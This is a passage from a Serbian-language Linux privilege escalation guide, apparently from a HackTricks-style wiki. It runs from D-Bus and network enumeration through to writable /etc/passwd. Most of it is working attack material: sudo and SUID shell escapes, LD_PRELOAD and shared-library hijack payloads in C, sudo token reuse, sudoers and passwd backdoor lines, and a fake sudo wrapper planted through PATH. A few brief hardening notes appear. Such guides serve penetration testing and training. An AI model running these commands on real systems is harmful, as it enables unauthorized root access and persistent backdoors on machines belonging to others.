D-Bus je sofisticiran sistem za inter-Process Communication (IPC) koji omogućava aplikacijama efikasnu međusobnu interakciju i razmenu podataka. Dizajniran za moderne Linux sisteme, pruža robustan okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržavajući osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na unapređene UNIX domain sockets. Pored toga, pomaže u emitovanju događaja ili signala, omogućavajući nesmetanu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolazećem pozivu može naterati music player da utiša reprodukciju, poboljšavajući korisničko iskustvo. D-Bus takođe podržava remote object sistem, pojednostavljujući zahteve servisima i pozive metoda između aplikacija, ubrzavajući procese koji su nekada bili kompleksni.

D-Bus radi po allow/deny modelu, upravljajući permisijama poruka (pozivi metoda, emitovanja signala, itd.) na osnovu kumulativnog dejstva odgovarajućih pravila politike. Ove politike specificiraju interakcije sa bus-om, što potencijalno može dovesti do eskalacije privilegija iskorišćavanjem tih permisija.

Primer takve politike u /etc/dbus-1/system.d/wpa_supplicant.conf je naveden, koji detaljno opisuje permisije za root korisnika da poseduje, šalje i prima poruke od fi.w1.wpa_supplicant1.

Politike bez specificiranog user-a ili group-e se primenjuju univerzalno, dok "default" context politike važe za sve koji nisu pokriveni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da enumerate i exploit a D-Bus communication ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo da enumerate mrežu i odredite poziciju mašine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini, a sa kojima niste mogli da stupite u interakciju pre pristupa:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete da sniff traffic. Ako možete, možda ćete moći da dobijete neke credentials.
```
timeout 1 tcpdump
```
## Korisnici

### Generička enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** se nalaze u sistemu, koji se mogu **prijaviti** i koji imaju **root privilegije**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke verzije Linuxa bile su pogođene ranjivošću koja omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Eksploatišite je** koristeći: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proverite da li se nešto zanimljivo nalazi u međuspremniku (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **poznajete bilo koju lozinku** iz okruženja, **pokušajte da se ulogujete kao svaki korisnik** koristeći tu lozinku.

### Su Brute

If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.

## Zloupotrebe upisivog PATH-a

### $PATH

Ako utvrdite da možete **pisati u neki direktorijum koji se nalazi u $PATH**, možda ćete moći da eskalirate privilegije tako što ćete **napraviti backdoor u tom upisivom direktorijumu** sa imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **nije učitana iz direktorijuma koji se nalazi pre** vašeg upisivog direktorijuma u $PATH.

### SUDO and SUID

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande vam omogućavaju da čitate i/ili upisujete fajlove ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može dozvoliti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`; sada je trivijalno dobiti shell dodavanjem ssh ključa u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi promenljivu okruženja** dok izvršava nešto:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB machine Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** da učita proizvoljnu python library dok se skripta izvršava kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sačuvan preko sudo env_keep → root shell

Ako sudoers sačuva `BASH_ENV` (npr., `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri pokretanju neinteraktivnih shelova da pokrenete proizvoljan kod kao root kada pozovete dozvoljenu komandu.

- Zašto radi: Za neinteraktivne shelove, Bash procenjuje `$BASH_ENV` i izvoruje taj fajl pre pokretanja ciljnog skripta. Mnogi sudo pravilnici dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako sudo sačuva `BASH_ENV`, vaš fajl će biti izvorovan sa root privilegijama.

- Zahtevi:
- Sudo pravilo koje možete izvršiti (bilo koji cilj koji poziva `/bin/bash` neinteraktivno, ili bilo koja bash skripta).
- `BASH_ENV` prisutan u `env_keep` (proverite sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, preferirajte `env_reset`.
- Izbegavajte shell wrappers za sudo-allowed commands; use minimal binaries.
- Razmotrite sudo I/O logging i alerting kada se koriste zadržane env varijable.

### Putanje za obilaženje izvršavanja sudo

**Skočite** da pročitate druge fajlove ili koristite **symlinks**. Na primer u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), to je još lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje komande

Ako je **sudo permission** dodeljeno jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti promenom PATH variable.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (uvek proveri pomoću** _**strings**_ **sadržaj čudnog SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, onda možeš pokušati da **export a function** imenovanu kao komanda koju suid file poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_ treba da pokušaš da kreiraš funkciju i exportuješ je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binary, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

Varijabla okruženja **LD_PRELOAD** koristi se za specificiranje jedne ili više deljenih biblioteka (.so fajlova) koje loader učitava pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao prethodno učitavanje biblioteke.

Međutim, da bi se održala bezbednost sistema i sprečilo zloupotrebljavanje ove funkcije, posebno kod **suid/sgid** izvršnih fajlova, sistem nameće određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove gde se real user ID (_ruid_) ne poklapa sa effective user ID (_euid_).
- Za izvršne fajlove sa **suid/sgid**, prethodno se učitavaju samo biblioteke u standardnim putanjama koje su takođe **suid/sgid**.

Privilege escalation može da se dogodi ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` sadrži izjavu **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da se promenljiva okruženja **LD_PRELOAD** zadrži i bude prepoznata čak i kada se komande pokreću uz `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **compile it** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše promenljivu okruženja **LD_LIBRARY_PATH** jer kontroliše putanju u kojoj će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binary fajl sa **SUID** dozvolama koji deluje neobično, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. Ovo se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku kao _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za exploitation.

Da bi se izvršio exploit, pristupa se kreiranju C fajla, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se kompajlira i izvrši, ima za cilj podizanje privilegija manipulacijom dozvola fajlova i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte prethodni C fajl u shared object (.so) fajl sa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binarnog fajla trebalo bi da pokrene exploit, što omogućava potencijalno kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava biblioteku iz direktorijuma u koji možemo pisati, kreirajmo biblioteku u tom direktorijumu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali treba da ima funkciju pod nazivom `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubaciti argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti da se pobegne iz ograničenih shell-ova, eskaliraju ili održe povišene privilegije, prenesu fajlovi, spawn bind i reverse shells, i olakšaju drugi post-exploitation zadaci.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete pristupiti `sudo -l` možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronađe način da iskoristi bilo koje sudo pravilo.

### Ponovna upotreba sudo tokena

U slučajevima kada imate **sudo pristup** ali ne i lozinku, možete eskalirati privilegije tako što ćete **sačekati izvršenje sudo komande i potom preuzeti session token**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** za izvršenje nečega u **poslednjih 15 minuta** (po defaultu to je trajanje sudo tokena koji nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno izmenom `/etc/sysctl.d/10-ptrace.conf` i postavljanjem `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi uslovi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Prvi exploit (`exploit.sh`) će kreirati binarni fajl `activate_sudo_token` u _/tmp_. Možete ga koristiti da **aktivirate sudo token u svojoj sesiji** (nećete automatski dobiti root shell, izvršite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root korisnika sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u folderu ili na bilo kojim od fajlova koji su kreirani unutar foldera, možete koristiti binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **create a sudo token for a user and PID**.\  
Na primer, ako možete prepisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **obtain sudo privileges** bez potrebe da znate password izvršavanjem:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi u okviru `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i na koji način. Ovi fajlovi **po defaultu mogu biti čitani samo od strane user root i group root**.\
**Ako** možete **pročitati** ovaj fajl, mogli biste da **dobijete neke zanimljive informacije**, a ako možete **pisati** bilo koji fajl, moći ćete da **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možete pisati, možete zloupotrebiti ovu dozvolu
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za binarni fajl `sudo`, kao što је `doas` za OpenBSD — ne zaboravite da проверите његову конфигурацију у `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **user obično povezuje na mašinu i koristi `sudo`** da eskalira privilegije i dobijete shell u kontekstu tog user-a, možete **kreirati novi sudo executable** koji će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **izmenite $PATH** u kontekstu user-a (na primer dodavanjem nove putanje u .bash_profile) tako da kada user izvrši sudo, izvrši se vaš sudo executable.

Napomena da ako user koristi drugi shell (ne bash) moraćete da izmenite druge fajlove da dodate novu putanju. Na primer[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete naći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečeg poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Fajl `/etc/ld.so.conf` pokazuje **odakle se učitavaju konfiguracioni fajlovi**. Obično ovaj fajl sadrži sledeću direktivu: `include /etc/ld.so.conf.d/*.conf`

To znači da će biti pročitani konfiguracioni fajlovi iz `/etc/ld.so.conf.d/*.conf`. Ti konfiguracioni fajlovi **pokazuju na druge foldere** gde će se tražiti **biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima permisije za pisanje** na bilo kom od navedenih puteva: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kojem fajlu unutar `/etc/ld.so.conf.d/` ili bilo kojoj fascikli na koju ukazuje neki konfiguracioni fajl u `/etc/ld.so.conf.d/*.conf` može biti u mogućnosti da eskalira privilegije.\
Pogledajte **kako iskoristiti ovu pogrešnu konfiguraciju** na sledećoj stranici:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/` biće korišćena od strane programa na ovom mestu kako je navedeno u varijabli `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim napravite zlonamernu biblioteku u `/var/tmp` sa `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Mogućnosti

Linux capabilities pružaju **podskup dostupnih root privilegija procesu**. Ovo efektivno razlaže root **privilegije na manje i odvojene jedinice**. Svaka od ovih jedinica može zatim biti nezavisno dodeljena procesima. Na ovaj način se smanjuje kompletan skup privilegija, što umanjuje rizik od eksploatacije.\
Pročitajte sledeću stranicu da biste **saznali više o capabilities i kako ih zloupotrebiti**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za "execute"** podrazumeva da pogođeni korisnik može "**cd**" u folder.\
**"read"** bit podrazumeva da korisnik može da prikaže listu fajlova, a **"write"** bit podrazumeva da korisnik može da obriše i kreira nove fajlove.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposobnih da **prepišu tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu pristupa fajlovima ili direktorijumima dozvoljavajući ili uskraćujući prava određenim korisnicima koji nisu vlasnici ili članovi grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Više detalja možete pronaći [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeliti** korisniku "kali" read i write dozvole nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Dohvati** fajlove sa specifičnim ACLs iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sesije

U **old versions** možete **hijack** neku **shell** sesiju drugog korisnika (**root**).\
U **newest versions** moći ćete da se **connect** na screen sesije samo **your own user**. Međutim, možete pronaći **interesting information inside the session**.

### screen sessions hijacking

**Lista screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Prikači se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **old tmux versions**. Nisam mogao da otmem tmux (v2.1) sesiju kreiranu od strane root-a kao neprivilegovan korisnik.

**Prikaži tmux sesije**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključi se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na Debian based systems (Ubuntu, Kubuntu, etc) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bagom.\
Ovaj bag nastaje prilikom kreiranja novog ssh ključa u tim OS-ovima, jer je **samo 32,768 varijacija bilo moguće**. To znači da se sve mogućnosti mogu izračunati i **imajući ssh public key možete pretražiti odgovarajući privatni ključ**. Izračunate mogućnosti možete pronaći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Zanimljive konfiguracione vrednosti

- **PasswordAuthentication:** Određuje da li je autentifikacija lozinkom dozvoljena. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je autentifikacija javnim ključem dozvoljena. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je autentifikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevano je `no`.

### PermitRootLogin

Određuje da li se root može prijaviti koristeći ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći lozinku i privatni ključ
- `without-password` or `prohibit-password`: root se može prijaviti samo pomoću privatnog ključa
- `forced-commands-only`: root se može prijaviti samo pomoću privatnog ključa i samo ako su navedene opcije komandi
- `no` : ne

### AuthorizedKeysFile

Određuje fajlove koji sadrže javne ključeve koji se mogu koristiti za autentifikaciju korisnika. Može da sadrži tokene kao `%h`, koji će biti zamenjeni home direktorijumom. **Možete navesti apsolutne putanje** (počevši od `/`) ili **relativne putanje u odnosu na home direktorijum korisnika**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će označiti da, ako pokušate da se prijavite koristeći **privatni** ključ korisnika "**testusername**", ssh će uporediti javni ključ vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **koristite vaše lokalne SSH ključeve umesto da ostavljate ključeve** (bez passphrases!) na vašem serveru. Tako ćete moći da se **preko ssh povežete** **na host**, a odatle **pređete na drugi** host **koristeći** **ključ** koji se nalazi na vašem **početnom hostu**.

Treba da podesite ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` postavljen na `*`, svaki put kada korisnik prelazi na drugu mašinu, taj host će moći da pristupi ključevima (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može **prebrisati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer **možda ćete moći da ga zloupotrebite za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Datoteke profila

Fajl `/etc/profile` i fajlovi u `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi shell**. Dakle, ako možete **da pišete ili izmenite bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka čudna skripta profila, trebalo bi je proveriti zbog **osetljivih detalja**.

### Passwd/Shadow Files

U zavisnosti od OS-a fajlovi `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili može postojati backup. Zato se preporučuje **pronađete sve njih** i **proverite da li ih možete pročitati** da biste videli **da li postoje hashes** unutar fajlova:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Ponekad možete pronaći **password hashes** u datoteci `/etc/passwd` (ili ekvivalentnoj).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo generišite lozinku jednom od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i dodajte generisani password.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Na primer: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: ovo može oslabiti trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete da **pišete u neke osetljive fajlove**. Na primer, da li možete da pišete u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
